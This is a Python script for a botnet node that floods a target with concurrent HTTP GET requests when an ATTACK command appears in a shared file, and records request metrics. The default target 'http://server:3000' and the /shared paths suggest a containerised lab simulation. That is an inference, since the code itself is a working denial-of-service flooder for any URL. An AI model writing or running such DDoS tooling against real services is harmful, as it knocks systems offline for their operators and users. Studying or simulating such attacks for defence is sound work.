import time
import requests # type: ignore
import os
import json
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Bot configuration
BOT_ID = os.environ.get('BOT_ID', 'bot_unknown')
TARGET = os.environ.get('TARGET', "http://server:3000")
METRICS_FILE = f"/shared/metrics_{BOT_ID}.json"
COMMAND_FILE = "/shared/command.txt"

# Attack parameters
REQUEST_COUNT = int(os.environ.get('REQUEST_COUNT', '50'))
REQUEST_TIMEOUT = 30  # Increased from 2s to 30s to handle slow responses
CONCURRENT_THREADS = int(os.environ.get('CONCURRENT_THREADS', '50'))  # Send 50 requests in parallel


class BotMetrics:
    def __init__(self, bot_id):
        self.bot_id = bot_id
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = time.time()
        self.lock = threading.Lock()  # Thread-safe counter
        
    def record_request(self, success=True):
        with self.lock:
            self.total_requests += 1
            if success:
                self.successful_requests += 1
            else:
                self.failed_requests += 1
    
    def get_stats(self):
        elapsed = time.time() - self.start_time
        return {
            "bot_id": self.bot_id,
            "total_requests": self.total_requests,
            "successful": self.successful_requests,
            "failed": self.failed_requests,
            "uptime_seconds": elapsed,
            "requests_per_second": self.total_requests / elapsed if elapsed > 0 else 0,
            "success_rate": (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0,
            "timestamp": datetime.now().isoformat()
        }
    
    def save_metrics(self):
        try:
            with open(METRICS_FILE, "w") as f:
                json.dump(self.get_stats(), f, indent=2)
        except Exception as e:
            print(f"[{BOT_ID}] Error saving metrics: {e}")

def get_command():
    """Read command from shared file"""
    try:
        with open(COMMAND_FILE, "r") as f:
            cmd = f.read().strip()
            return cmd
    except FileNotFoundError:
        return "STOP"
    except Exception as e:
        print(f"[{BOT_ID}] Error reading command: {e}")
        return "STOP"

def perform_attack(metrics):
    """Execute DDoS attack - HTTP Flood (Concurrent)"""
    print(f"[{BOT_ID}] Attacking {TARGET} with {CONCURRENT_THREADS} concurrent threads...")
    
    # main logic botnet
    def send_request(request_num):
        """Send a single request (called concurrently)"""
        try:
            response = requests.get(TARGET, timeout=REQUEST_TIMEOUT) # requests are send
            metrics.record_request(success=response.status_code in [200, 503])
            if request_num % 100 == 0:
                print(f"[{BOT_ID}] Sent {request_num}/{REQUEST_COUNT} requests")
        except requests.exceptions.Timeout:
            metrics.record_request(success=False)
        except Exception as e:
            metrics.record_request(success=False)
    
    # Use ThreadPoolExecutor for concurrent requests
    with ThreadPoolExecutor(max_workers=CONCURRENT_THREADS) as executor:
        futures = [executor.submit(send_request, i) for i in range(1, REQUEST_COUNT + 1)]
        
        # Wait for all requests to complete
        completed = 0
        for future in as_completed(futures):
            try:
                future.result()
                completed += 1
            except Exception as e:
                print(f"[{BOT_ID}] Thread error: {e}")

def main():
    print(f"[{BOT_ID}] Bot started. Target: {TARGET}")
    print(f"[{BOT_ID}] Listening to: {COMMAND_FILE}")
    
    metrics = BotMetrics(BOT_ID)
    last_command = "STOP"
    
    while True:
        try:
            current_command = get_command()
            
            # Command changed
            if current_command != last_command:
                if current_command == "ATTACK":
                    print(f"[{BOT_ID}]   ATTACK command received")
                    perform_attack(metrics)
                    print(f"[{BOT_ID}] Attack completed. Stats: {metrics.get_stats()}")
                elif current_command == "STOP":
                    if last_command == "ATTACK":
                        print(f"[{BOT_ID}] Attack stopped by operator")
                    else:
                        print(f"[{BOT_ID}] Status: IDLE (waiting for commands)")
                
                last_command = current_command
            
            # Save metrics periodically
            metrics.save_metrics()
            time.sleep(1)
            
        except KeyboardInterrupt:
            print(f"\n[{BOT_ID}] Bot shutting down")
            metrics.save_metrics()
            break
        except Exception as e:
            print(f"[{BOT_ID}] Unexpected error: {e}")
            time.sleep(1)

if __name__ == "__main__":
    main()